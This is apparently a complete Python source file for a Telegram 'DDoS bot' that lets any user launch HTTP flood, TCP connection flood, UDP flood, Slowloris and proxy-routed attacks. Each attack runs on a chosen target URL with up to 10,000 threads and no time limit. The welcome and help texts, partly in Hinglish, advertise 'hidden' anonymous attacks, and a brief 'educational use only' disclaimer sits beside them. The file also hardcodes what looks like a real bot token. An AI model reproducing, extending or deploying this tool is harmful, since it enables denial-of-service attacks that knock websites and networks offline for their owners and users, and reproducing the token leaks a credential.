from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
import threading
import urllib.request
import random
import time
import socket
from user_agent import generate_user_agent
from urllib.request import ProxyHandler, build_opener
import sqlite3
from datetime import datetime
import logging
import asyncio

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Global variables
active_attacks = {}

# Conversation states
ATTACK_TYPES, TARGET_URL, THREAD_COUNT, DURATION = range(4)

# Database setup
def init_db():
    conn = sqlite3.connect('ddos_bot.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS attacks
                 (user_id INTEGER, target TEXT, attack_type TEXT, threads INTEGER, 
                  duration INTEGER, start_time TEXT, requests_sent INTEGER)''')
    conn.commit()
    conn.close()

init_db()

class PowerfulDDoSAttack:
    def __init__(self, user_id):
        self.user_id = user_id
        self.target_url = None
        self.is_running = False
        self.threads = []
        self.attack_type = None
        self.thread_count = 1000
        self.duration = 0
        self.start_time = None
        self.requests_sent = 0
        self.successful_requests = 0
        self.stop_flag = threading.Event()
    
    def start_attack(self):
        if self.is_running:
            return
        
        self.stop_flag.clear()
        self.is_running = True
        self.start_time = time.time()
        self.requests_sent = 0
        self.successful_requests = 0
        
        # Start attack based on type
        attack_methods = {
            'http_flood': self.start_http_flood,
            'tcp_syn': self.start_tcp_syn,
            'udp_flood': self.start_udp_flood,
            'slowloris': self.start_slowloris,
            'proxy_attack': self.start_proxy_attack
        }
        
        if self.attack_type in attack_methods:
            attack_methods[self.attack_type]()
        
        # Auto-stop if duration set
        if self.duration > 0:
            threading.Thread(target=self.auto_stop, daemon=True).start()
    
    def start_http_flood(self):
        for i in range(self.thread_count):
            thread = threading.Thread(target=self.http_flood_worker, daemon=True)
            thread.start()
            self.threads.append(thread)
    
    def start_tcp_syn(self):
        for i in range(min(500, self.thread_count)):
            thread = threading.Thread(target=self.tcp_syn_worker, daemon=True)
            thread.start()
            self.threads.append(thread)
    
    def start_udp_flood(self):
        for i in range(min(300, self.thread_count)):
            thread = threading.Thread(target=self.udp_flood_worker, daemon=True)
            thread.start()
            self.threads.append(thread)
    
    def start_slowloris(self):
        for i in range(min(100, self.thread_count)):
            thread = threading.Thread(target=self.slowloris_worker, daemon=True)
            thread.start()
            self.threads.append(thread)
    
    def start_proxy_attack(self):
        for i in range(self.thread_count):
            thread = threading.Thread(target=self.proxy_attack_worker, daemon=True)
            thread.start()
            self.threads.append(thread)
    
    def http_flood_worker(self):
        while self.is_running and not self.stop_flag.is_set() and self.check_duration():
            try:
                headers = {
                    'User-Agent': generate_user_agent(),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-us,en;q=0.5',
                    'Accept-Encoding': 'gzip,deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Referer': 'https://www.google.com/'
                }
                
                random_param = f"?cache_buster={random.randint(100000,999999)}"
                target = self.target_url + random_param
                
                req = urllib.request.Request(target, headers=headers)
                response = urllib.request.urlopen(req, timeout=8)
                
                self.requests_sent += 1
                if response.getcode() == 200:
                    self.successful_requests += 1
                
            except Exception as e:
                self.requests_sent += 1
    
    def tcp_syn_worker(self):
        try:
            target_ip = socket.gethostbyname(self.target_url.split('//')[-1].split('/')[0])
        except:
            target_ip = self.target_url
        
        target_port = 80
        
        while self.is_running and not self.stop_flag.is_set() and self.check_duration():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target_ip, target_port))
                sock.close()
                self.requests_sent += 1
            except:
                self.requests_sent += 1
    
    def udp_flood_worker(self):
        try:
            target_ip = socket.gethostbyname(self.target_url.split('//')[-1].split('/')[0])
        except:
            target_ip = self.target_url
        
        while self.is_running and not self.stop_flag.is_set() and self.check_duration():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(512)
                sock.sendto(data, (target_ip, random.randint(1000, 65535)))
                sock.close()
                self.requests_sent += 1
                time.sleep(0.01)
            except:
                self.requests_sent += 1
    
    def slowloris_worker(self):
        target = self.target_url.split('//')[-1].split('/')[0]
        
        while self.is_running and not self.stop_flag.is_set() and self.check_duration():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target, 80))
                s.send(f"GET / HTTP/1.1\r\n".encode())
                s.send(f"Host: {target}\r\n".encode())
                
                start_time = time.time()
                while self.is_running and not self.stop_flag.is_set() and (time.time() - start_time) < 30:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                    time.sleep(10)
                
                s.close()
                self.requests_sent += 1
            except:
                self.requests_sent += 1
    
    def proxy_attack_worker(self):
        while self.is_running and not self.stop_flag.is_set() and self.check_duration():
            try:
                ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
                ports = [80, 443, 8080, 3128, 1080, 8888]
                port = random.choice(ports)
                proxy = f"{ip}:{port}"
                
                headers = {
                    'User-Agent': generate_user_agent(),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                }
                
                proxy_handler = ProxyHandler({'http': f'http://{proxy}', 'https': f'https://{proxy}'})
                opener = build_opener(proxy_handler)
                
                response = opener.open(urllib.request.Request(self.target_url, headers=headers), timeout=10)
                
                self.requests_sent += 1
                if response.getcode() == 200:
                    self.successful_requests += 1
                    
            except Exception as e:
                self.requests_sent += 1
    
    def check_duration(self):
        if self.duration == 0:
            return True
        return (time.time() - self.start_time) < self.duration
    
    def auto_stop(self):
        time.sleep(self.duration)
        if self.is_running:
            self.stop_attack()
    
    def stop_attack(self):
        self.stop_flag.set()
        self.is_running = False
        self.threads = []
    
    def get_stats(self):
        if self.start_time:
            elapsed = time.time() - self.start_time
            rps = self.requests_sent / elapsed if elapsed > 0 else 0
            success_rate = (self.successful_requests / self.requests_sent * 100) if self.requests_sent > 0 else 0
        else:
            elapsed = rps = success_rate = 0
        
        return {
            'elapsed': elapsed,
            'requests_sent': self.requests_sent,
            'successful_requests': self.successful_requests,
            'rps': rps,
            'success_rate': success_rate,
            'threads': len([t for t in self.threads if t.is_alive()]),
            'is_running': self.is_running
        }

# Telegram Bot Functions
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_name = user.first_name
    user_id = user.id
    
    # Try to get user profile photo
    profile_photo_url = None
    try:
        if user.photo:
            photo_file = await user.get_profile_photos(limit=1)
            if photo_file.total_count > 0:
                file = await context.bot.get_file(photo_file.photos[0][-1].file_id)
                profile_photo_url = file.file_path
    except Exception as e:
        logger.info(f"Could not get profile photo: {e}")
    
    welcome_message = f"""
🎊 **WELCOME {user_name.upper()}!** 🎊

📸 *Your Profile Photo Loaded Successfully!*

╔═══════════════════════════╗
║     🚀 **ULTIMATE DDOS BOT** 🚀    ║
║        **POWERED BY**         ║
║        **DARK GOKU̶**          ║
╚═══════════════════════════╝

👋 **Hello {user_name}!** Welcome to the most powerful DDoS bot!

⚡ **BOT FEATURES:**
• 🎯 5 Different Attack Methods
• 🚀 Up to 10,000 Threads  
• ⏰ Unlimited Duration
• 📊 Live Statistics
• 👥 Multi-User Support
• 🛡️ Proxy Support
• 💾 Database Storage

📋 **QUICK COMMANDS:**
/attack - 🎯 Start New Attack
/stop - 🛑 Stop Current Attack  
/status - 📊 Check Attack Status
/stats - 📈 Detailed Statistics
/help - ❓ Help & Guide

🎮 **EASY TO USE:**
• All controls via keyboard buttons
• No manual typing needed
• Real-time updates

⚠️ **LEGAL DISCLAIMER:**
This bot is for educational and authorized testing purposes only. Misuse is strictly prohibited.

🔐 **User ID:** `{user_id}`
🕐 **Login Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

**Ready to launch attacks? Use /attack to begin!**
    """
    
    if profile_photo_url:
        # Send message with profile photo
        await context.bot.send_photo(
            chat_id=update.effective_chat.id,
            photo=profile_photo_url,
            caption=welcome_message,
            parse_mode='Markdown'
        )
    else:
        # Send without photo
        await update.message.reply_text(welcome_message, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
🆘 **COMPLETE HELP GUIDE** 🆘

🎯 **ATTACK TYPES:**

🚀 **HTTP FLOOD** 
• Website/server par bahut saare requests
• Best for: Web servers, websites
• Speed: Very Fast
• Risk: Low

🔒 **TCP SYN**
• Network layer attack  
• Best for: Network devices
• Speed: Fast
• Risk: Medium

📡 **UDP FLOOD**
• Bandwidth consumption attack
• Best for: Internet bandwidth
• Speed: Very Fast  
• Risk: High (Internet band ho sakta hai)

🐌 **SLOWLORIS**
• Slow connection attack
• Best for: Web servers
• Speed: Slow but effective
• Risk: Low

🛡️ **PROXY ATTACK**
• Anonymous attack through proxies
• Best for: Hidden attacks
• Speed: Medium
• Risk: Low

👥 **THREAD OPTIONS:**
• 2,000 - Normal Power
• 5,000 - High Power  
• 10,000 - Maximum Power

⏰ **DURATION OPTIONS:**
• 30s - Testing
• 60s - Short Attack
• 300s - Medium Attack  
• 600s - Long Attack
• Unlimited - Manual Stop

📊 **STATUS CODES:**
• 🟢 RUNNING - Attack chal raha hai
• 🔴 STOPPED - Attack band hai
• 📊 STATS - Detailed information

🛑 **SAFETY FEATURES:**
• Auto-stop after duration
• Thread limits
• Proper resource management
• Multi-user support

💡 **TIPS:**
1. Start with HTTP FLOOD for testing
2. Use 2,000 threads for beginners
3. Set duration to 60s for first test
4. Check /status regularly
5. Use /stop to immediately stop

⚠️ **WARNINGS:**
• UDP Flood se internet band ho sakta hai
• Zyada threads system slow kar sakte hain
• Illegal use strictly prohibited
    """
    
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in active_attacks and active_attacks[user_id].is_running:
        await update.message.reply_text(
            "❌ **Pahle Current Attack Band Karein!**\n\n"
            "Aapka ek attack already chal raha hai.\n"
            "Pehle /stop command use karein.",
            reply_markup=ReplyKeyboardMarkup([['/stop']], one_time_keyboard=True)
        )
        return ConversationHandler.END
    
    reply_keyboard = [
        ['🚀 HTTP FLOOD', '🔒 TCP SYN'],
        ['📡 UDP FLOOD', '🐌 SLOWLORIS'], 
        ['🛡️ PROXY ATTACK', '❌ CANCEL']
    ]
    
    await update.message.reply_text(
        "🎯 **ATTACK TYPE SELECT KAREIN:**\n\n"
        "🚀 **HTTP FLOOD** - Website attack (Recommended)\n"
        "🔒 **TCP SYN** - Network attack\n"
        "📡 **UDP FLOOD** - Bandwidth attack (Risk High)\n"  
        "🐌 **SLOWLORIS** - Slow connection attack\n"
        "🛡️ **PROXY ATTACK** - Anonymous attack\n\n"
        "**Please choose:**",
        reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True)
    )
    
    return ATTACK_TYPES

async def attack_type_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_choice = update.message.text.lower()
    
    if 'cancel' in user_choice:
        await update.message.reply_text("✅ Attack cancelled.", reply_markup=ReplyKeyboardRemove())
        return ConversationHandler.END
    
    attack_type_map = {
        '🚀 http flood': 'http_flood',
        '🔒 tcp syn': 'tcp_syn',
        '📡 udp flood': 'udp_flood', 
        '🐌 slowloris': 'slowloris',
        '🛡️ proxy attack': 'proxy_attack'
    }
    
    attack_type = attack_type_map.get(user_choice)
    
    if not attack_type:
        await update.message.reply_text("❌ Invalid choice! Please select from buttons.")
        return ATTACK_TYPES
    
    context.user_data['attack_type'] = attack_type
    
    # Show attack type info
    attack_info = {
        'http_flood': "🚀 **HTTP FLOOD Selected**\nFast website attack - Best for beginners",
        'tcp_syn': "🔒 **TCP SYN Selected**\nNetwork layer attack - Medium risk", 
        'udp_flood': "📡 **UDP FLOOD Selected**\nBandwidth attack - HIGH RISK WARNING",
        'slowloris': "🐌 **SLOWLORIS Selected**\nSlow connection attack - Stealth mode",
        'proxy_attack': "🛡️ **PROXY ATTACK Selected**\nAnonymous attack - Hidden identity"
    }
    
    await update.message.reply_text(
        f"{attack_info[attack_type]}\n\n"
        "🌐 **Ab Target URL Daalein:**\n\n"
        "Examples:\n"
        "• https://example.com\n" 
        "• http://192.168.1.1\n"
        "• example.com\n\n"
        "**URL yahan type karein:**",
        reply_markup=ReplyKeyboardRemove()
    )
    
    return TARGET_URL

async def target_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target_url = update.message.text
    
    # Add http:// if missing
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    context.user_data['target_url'] = target_url
    
    reply_keyboard = [
        ['2,000 Threads', '5,000 Threads'],
        ['10,000 Threads', '❌ CANCEL']
    ]
    
    await update.message.reply_text(
        "👥 **THREAD COUNT SELECT KAREIN:**\n\n"
        "**2,000 Threads** - Normal Power\n"
        "**5,000 Threads** - High Power\n" 
        "**10,000 Threads** - Maximum Power\n\n"
        "⚠️ **Note:** Zyada threads = Zyada power\n"
        "But system slow ho sakta hai",
        reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True)
    )
    
    return THREAD_COUNT

async def threads_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_choice = update.message.text.lower()
    
    if 'cancel' in user_choice:
        await update.message.reply_text("✅ Attack cancelled.", reply_markup=ReplyKeyboardRemove())
        return ConversationHandler.END
    
    thread_map = {
        '2,000 threads': 2000,
        '5,000 threads': 5000, 
        '10,000 threads': 10000
    }
    
    thread_count = thread_map.get(user_choice)
    
    if not thread_count:
        await update.message.reply_text("❌ Invalid choice! Please select from buttons.")
        return THREAD_COUNT
    
    context.user_data['thread_count'] = thread_count
    
    reply_keyboard = [
        ['30 Seconds', '60 Seconds'],
        ['300 Seconds', '600 Seconds'],
        ['Unlimited', '❌ CANCEL']
    ]
    
    await update.message.reply_text(
        "⏰ **ATTACK DURATION SELECT KAREIN:**\n\n"
        "**30 Seconds** - Testing ke liye\n"
        "**60 Seconds** - Short attack\n"
        "**300 Seconds** - Medium attack\n"
        "**600 Seconds** - Long attack\n"
        "**Unlimited** - Manual stop required\n\n"
        "⚠️ **Warning:** Unlimited duration mein manual /stop karna hoga",
        reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True)
    )
    
    return DURATION

async def duration_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_choice = update.message.text.lower()
    
    if 'cancel' in user_choice:
        await update.message.reply_text("✅ Attack cancelled.", reply_markup=ReplyKeyboardRemove())
        return ConversationHandler.END
    
    duration_map = {
        '30 seconds': 30,
        '60 seconds': 60,
        '300 seconds': 300,
        '600 seconds': 600, 
        'unlimited': 0
    }
    
    duration = duration_map.get(user_choice)
    
    if duration is None:
        await update.message.reply_text("❌ Invalid choice! Please select from buttons.")
        return DURATION
    
    # Start the attack
    attack = PowerfulDDoSAttack(user_id)
    attack.target_url = context.user_data['target_url']
    attack.attack_type = context.user_data['attack_type']
    attack.thread_count = context.user_data['thread_count']
    attack.duration = duration
    
    active_attacks[user_id] = attack
    attack.start_attack()
    
    # Attack type display name
    attack_names = {
        'http_flood': '🚀 HTTP FLOOD',
        'tcp_syn': '🔒 TCP SYN',
        'udp_flood': '📡 UDP FLOOD',
        'slowloris': '🐌 SLOWLORIS', 
        'proxy_attack': '🛡️ PROXY ATTACK'
    }
    
    attack_name = attack_names.get(attack.attack_type, attack.attack_type.upper())
    
    duration_text = "Unlimited (Manual Stop)" if duration == 0 else f"{duration} Seconds"
    
    await update.message.reply_text(
        f"🎯 **ATTACK SUCCESSFULLY STARTED!** 🎯\n\n"
        f"**Target:** `{attack.target_url}`\n"
        f"**Type:** {attack_name}\n" 
        f"**Threads:** {attack.thread_count:,}\n"
        f"**Duration:** {duration_text}\n"
        f"**Status:** 🔴 RUNNING\n\n"
        f"⚡ **Attack Progress:**\n"
        f"• Requests sending...\n"
        f"• Threads activated\n"
        f"• Target engaged\n\n"
        f"📊 **Monitor Commands:**\n"
        f"/status - Live status dekhein\n"
        f"/stats - Detailed statistics\n"
        f"/stop - Attack band karein\n\n"
        f"⚠️ **Auto-stop:** {f'{duration}s mein' if duration > 0 else 'Manual stop required'}",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    
    return ConversationHandler.END

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in active_attacks and active_attacks[user_id].is_running:
        attack = active_attacks[user_id]
        stats = attack.get_stats()
        
        attack.stop_attack()
        
        await update.message.reply_text(
            f"🛑 **ATTACK COMPLETELY STOPPED!** 🛑\n\n"
            f"**Final Statistics:**\n"
            f"• ⏱️ Duration: {stats['elapsed']:.1f}s\n"
            f"• 📤 Requests Sent: {stats['requests_sent']:,}\n"
            f"• ✅ Successful: {stats['successful_requests']:,}\n"
            f"• 🚀 RPS: {stats['rps']:.1f}\n"
            f"• 📈 Success Rate: {stats['success_rate']:.1f}%\n\n"
            f"✅ **All threads terminated!**\n"
            f"✅ **No more requests being sent!**",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            "❌ **No Active Attack Found!**\n\n"
            "Aapka koi attack currently nahi chal raha.\n"
            "Naya attack start karne ke liye /attack use karein."
        )

async def attack_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in active_attacks:
        attack = active_attacks[user_id]
        stats = attack.get_stats()
        
        status_icon = "🔴" if attack.is_running else "🟢"
        status_text = "RUNNING" if attack.is_running else "STOPPED"
        
        attack_names = {
            'http_flood': '🚀 HTTP FLOOD',
            'tcp_syn': '🔒 TCP SYN', 
            'udp_flood': '📡 UDP FLOOD',
            'slowloris': '🐌 SLOWLORIS',
            'proxy_attack': '🛡️ PROXY ATTACK'
        }
        
        attack_name = attack_names.get(attack.attack_type, attack.attack_type.upper())
        
        status_msg = (
            f"📊 **ATTACK STATUS** 📊\n\n"
            f"**Target:** `{attack.target_url}`\n"
            f"**Type:** {attack_name}\n"
            f"**Status:** {status_icon} {status_text}\n\n"
            f"**Live Statistics:**\n"
            f"• ⏱️ Duration: {stats['elapsed']:.1f}s\n"
            f"• 📤 Requests: {stats['requests_sent']:,}\n"
            f"• ✅ Successful: {stats['successful_requests']:,}\n"
            f"• 🚀 RPS: {stats['rps']:.1f}\n"
            f"• 📈 Success Rate: {stats['success_rate']:.1f}%\n"
            f"• 👥 Active Threads: {stats['threads']}\n"
        )
        
        if attack.duration > 0 and attack.is_running:
            remaining = max(0, attack.duration - stats['elapsed'])
            status_msg += f"• ⏳ Time Left: {remaining:.1f}s\n"
        
        await update.message.reply_text(status_msg, parse_mode='Markdown')
    else:
        await update.message.reply_text(
            "📊 **No Active Attack**\n\n"
            "Aapka koi attack currently nahi chal raha.\n"
            "Naya attack start karne ke liye /attack use karein."
        )

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in active_attacks:
        stats_data = active_attacks[user_id].get_stats()
        attack = active_attacks[user_id]
        
        attack_names = {
            'http_flood': '🚀 HTTP FLOOD',
            'tcp_syn': '🔒 TCP SYN',
            'udp_flood': '📡 UDP FLOOD',
            'slowloris': '🐌 SLOWLORIS',
            'proxy_attack': '🛡️ PROXY ATTACK'
        }
        
        attack_name = attack_names.get(attack.attack_type, attack.attack_type.upper())
        
        stats_msg = (
            f"📈 **DETAILED STATISTICS** 📈\n\n"
            f"**Attack Information:**\n"
            f"• Target: `{attack.target_url}`\n"
            f"• Type: {attack_name}\n"
            f"• Running: {'✅ YES' if attack.is_running else '❌ NO'}\n"
            f"• Threads Configured: {attack.thread_count:,}\n\n"
            f"**Performance Metrics:**\n"
            f"• Total Requests: {stats_data['requests_sent']:,}\n"
            f"• Successful: {stats_data['successful_requests']:,}\n"
            f"• Failed: {stats_data['requests_sent'] - stats_data['successful_requests']:,}\n"
            f"• Requests/Sec: {stats_data['rps']:.1f}\n"
            f"• Success Rate: {stats_data['success_rate']:.1f}%\n"
            f"• Active Threads: {stats_data['threads']}\n"
            f"• Duration: {stats_data['elapsed']:.1f}s\n"
        )
        
        await update.message.reply_text(stats_msg, parse_mode='Markdown')
    else:
        await update.message.reply_text(
            "❌ **No Attack Data Available!**\n\n"
            "Aapka koi attack history nahi mili.\n"
            "Pehle attack start karein statistics ke liye."
        )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "✅ Operation cancelled.", 
        reply_markup=ReplyKeyboardRemove()
    )
    return ConversationHandler.END

def main():
    TOKEN = "8549626626:AAFOapFkuuPHtIFbPaQsevi1uoPSWS-Vm3w"
    
    application = Application.builder().token(TOKEN).build()
    
    # Conversation handler for attack flow
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('attack', attack)],
        states={
            ATTACK_TYPES: [MessageHandler(filters.TEXT & ~filters.COMMAND, attack_type_selected)],
            TARGET_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, target_received)],
            THREAD_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, threads_received)],
            DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, duration_received)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop_attack))
    application.add_handler(CommandHandler("status", attack_status))
    application.add_handler(CommandHandler("stats", stats))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("cancel", cancel))
    
    print("🚀 ULTIMATE DDoS BOT STARTED SUCCESSFULLY!")
    print("⭐ Features: User Profile Photos, Keyboard Controls, Multi-User")
    print("🔧 Developer: @gokuuuu_1̶")
    print("📅 Server Ready for Hosting...")
    
    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()
